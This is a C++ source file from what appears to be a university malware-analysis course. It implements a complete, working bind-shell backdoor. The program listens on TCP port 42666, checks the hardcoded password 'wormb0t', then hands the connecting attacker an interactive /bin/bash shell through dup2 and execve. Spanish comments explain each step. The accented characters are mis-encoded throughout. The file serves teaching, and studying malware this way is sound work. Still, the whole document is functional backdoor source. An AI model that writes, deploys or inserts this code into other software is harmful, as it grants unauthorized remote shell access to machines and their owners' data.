//////////////////////////////////////////////////////////////
//        An√°lisis de Software Malicioso: Semana 6.
//
// T√≠tulo:          Puerta trasera (Backdoor).
// Archivo:         backd00r.cpp.
// Semestre:        2019-2.
//
// Author:          Concha V√°zquez Miguel.
// Correo:          mconcha@ciencias.unam.mx
// Profesor:        Jonathan Banfi V√°zquez.
//
//////////////////////////////////////////////////////////////

// Con las directivas condicionales del preprocesador podemos saber acerca del equipo.
#ifdef __linux__
    // Impresi√≥n usando cout.
    #include <iostream>
    // strlen(), strcmp(), etc.
    #include <string.h>
    // Funciones de sockets.
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <unistd.h>
    // En este caso sabemos que estamos en un equipo con una distribuci√≥n de Linux.
    #define LINUX true
    // Puerto hardcodeado al que se asociar√° el socket si no se especifica otro.
    #define PUERTO 42666
    // Contrase√±a para que el atacante pueda conectarse a la puerta trasera.
    #define PASSW0RD "wormb0t"
    using namespace std;
#else
    // Sabemos que no estamos en un equipo con una distribuci√≥n de Linux.
    #define LINUX false
#endif

/**
 * Funci√≥n para corroborar que el programa sea ejecutado en un Sistema Operativo
 * tipo Linux.
 */
void verificar_linux() {
    /* De acuerdo al valor del macro dependiendo del caso en el que haya ca√≠do
       por la directiva condicional del preprocesador se termina la ejecuci√≥n
       o se tiene √©xito.
    */
    if(!LINUX) {
        perror("El sistema operativo no es una distro de Linux.");
        exit(1);    
    }
    cout << "‚úì Sistema Operativo Linux." << endl;
}

/**
 * Funci√≥n que devuelve el entero del puerto que ser√° usado para la conexi√≥n en la capa
 * de Transporte a partir de si se proporcion√≥ o no en los argumentos de l√≠nea de comandos.
 * @param argc El n√∫mero de argumentos dados en la ejecuci√≥n por CLI.
 * @param argv El vector de argumentos provistos.
 * @return El entero que representa al puerto ef√≠mero a ser usado en la conexi√≥n.
 * @rtype int
 */
int establecer_puerto(int argc, char **argv) {
    int puerto;
    // Nos lo propocionaron en l√≠nea de comandos como cadena; hay que pasarlo a entero.
    if (argv[1]) {
        puerto = stoi(argv[1]);
    } else {
        // Caso en el que no nos lo dieron y usamos el puerto predefinido por el macro.
        puerto = PUERTO;
    }
    // Recordando que se puede proporcionar un puerto en espec√≠fico al ejecutar el programa.
    if (argc < 2) {
        cout << "üêõ Es posible cambiar el puerto con: " << argv[0] << " <no. puerto>." << endl;
    }
    return puerto;
}

/**
 * Funci√≥n que crea un socket y lo asociamos con una variable entera (descriptor de archivo)
 * con la cual identificar al socket.
 *
 * @param descriptor_archivo La referencia a la variable entera del descriptor de archivo
 * a la que asociaremos el socket creado con la llamada al sistema. No queremos
 * que sea paso por valor, as√≠ que se usa el ampersand.
 */
void crear_socket(int &descriptor_archivo) {
    // Intentando crear el socket y asociarlo a la variable entera.
    // En caso de fallo la llamada al sistema devuelve -1.
    // DOMAIN=AF_INET (TCP/IP); TYPE=SOCK_STREAM (Orientado a conexi√≥n, TCP y no UDP); PROTOCOL = 0 (usar el conveniente).
    if ((descriptor_archivo = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        // En caso de fallo (valor negativo), terminamos la ejecuci√≥n.
        perror("‚úó Fallo de creaci√≥n del socket.");
        exit(1);
    }   
}

/**
 * Funci√≥n para inicializar la estructura sockaddr_in que se usa en tecnolog√≠as
 * AF_INET (TCP/IP) para poder hacer referencia a los elementos del socket.
 * 
 * @param puerto El puerto asociado al socket.
 * @return servidor La estructura creada.
 * @rtype struct sockaddr_in
 */
struct sockaddr_in crear_estructura_transporte(int puerto) {
    // Creando la estructura.
    struct sockaddr_in servidor;
    // La familia es la de TCP/IP.
    servidor.sin_family = AF_INET;
    // El puerto lo pasamos de un unsigned short integer del host al orden de bytes
    // usados en la red (big endian).
    servidor.sin_port = htons(puerto);
    // Permitimos que se conecte a nosotros cualquier direcci√≥n IP (0.0.0.0).
    // Una alternativa ser√≠a prefijar la direcci√≥n del atacante, pero queremos que
    // se pueda conectar a la puerta trasera desde varias PCs.
    servidor.sin_addr.s_addr = INADDR_ANY;
    return servidor;
}

/**
 * Funci√≥n que permite asociar una direcci√≥n al socket que antes
 * solamente existe en el espacio de nombres, pero es hasta ahora
 * inservible. Le "asignamos un nombre al socket".    
 *
 * @param fd El descriptor de archivo que hace referencia al socket.
 * @param con La estructura que contiene la direcci√≥n que ser√° enlazada al socket.
 */
void enlazar(int fd, struct sockaddr_in con) {
    // Se logra con la llamada al sistema bind().
    // Tenemos que hacer el 'cast' de struct sockaddr_in a struct sockaddr.
    // Si es -1, quiere decir que hubo un error y lo reportamos, terminando la ejecuci√≥n.
    if (bind(fd, (struct sockaddr *)&con, sizeof(con)) == -1) {
        perror("‚úó Error en el enlace");
        exit(1);
    }
    cout << "‚úì Enlace completado." << endl;
}   

int main(int argc, char **argv) {
    // Hacer m√°s r√°pido los couts sin sincronizarlos con retrocompatibilidad para printf.
    ios::sync_with_stdio(0);
    // Checando que estemos en un equipo con una distribuci√≥n de Linux.
    verificar_linux();
    // Determinando el puerto al que se asociar√° el socket.
    int puerto = establecer_puerto(argc, argv);
    // Creando el socket y teniendo el descriptor de archivo para hacer referencia a este.
    int descriptor_archivo;
    crear_socket(descriptor_archivo);   
    // Creando la estructura del socket.
    struct sockaddr_in con = crear_estructura_transporte(puerto);
    // Enlazando el socket a la direcci√≥n contenida en la estructura.
    enlazar(descriptor_archivo, con);
    // Escuchando a que llegue una conexi√≥n; permitimos una sola conexi√≥n (backlog=1).
    listen(descriptor_archivo, 1);
    cout << "‚åõ Esperando una conexi√≥n..." << endl;
    // Espera ocupada, en tando haya error en la aceptaci√≥n de la conexi√≥n.
    while ((descriptor_archivo = accept(descriptor_archivo, 0, 0)) == -1);
    // Pasando este punto ya se ha establecido la conexi√≥n.
    cout << "‚úå  Conectado" << endl;
    // Mensajes predefinidos constantes.
    char const* bienvenida = "Backd00r ~ ‚ò≠ Abrx4s\n\nContrase√±a: ";
    char const* mensaje_exito = "üòà Contrase√±a correcta. Est√°s dentro y con acceso a la shell.\n";
    char const* mensaje_error = "Contrase√±a incorrecta.\n";
    // Dando la bienvenida al atacante.
    send(descriptor_archivo, bienvenida, strlen(bienvenida), 0);
    // Arreglo de caracteres que fungir√° como el buffer para la respuesta.
    char buffer[1024];
    // Poniendo ceros en todo el buffer por si ten√≠a basura.
    memset(buffer, 0, 1024);
    // Recibiendo 1024 bytes (caracteres) del atacante.
    recv(descriptor_archivo, buffer, 1024, 0);
    // Le agregamos el final a lo que recibimos.
    buffer[strlen(buffer) - 1] = '\0';
    // En caso de que lo recibido coincida con la contrase√±a, entonces le informamos del √©xito.
    if (strcmp(PASSW0RD, buffer) == 0) {
        send(descriptor_archivo, mensaje_exito, strlen(mensaje_exito), 0);
    } else {
        // En el otro caso, le informamos del error e interrumpimos la ejecuci√≥n.
        send(descriptor_archivo, mensaje_error, strlen(mensaje_error), 0);
        exit(1);
    }
    dup2(descriptor_archivo, 0);
    dup2(descriptor_archivo, 1);
    dup2(descriptor_archivo, 2);
    // Ejecutando el shell de este sistema (bash).
    extern char** environ;
    char* newargv[] = { NULL };
    // exceve ejecuta el programa dado como cadena.
    // Se le pueden pasar argumentos al nuevo programa, pero no es de nuestro inter√©s.
    execve("/bin/bash", newargv, environ);
    // Terminando la ejecuci√≥n exitosamente.
    exit(0);
}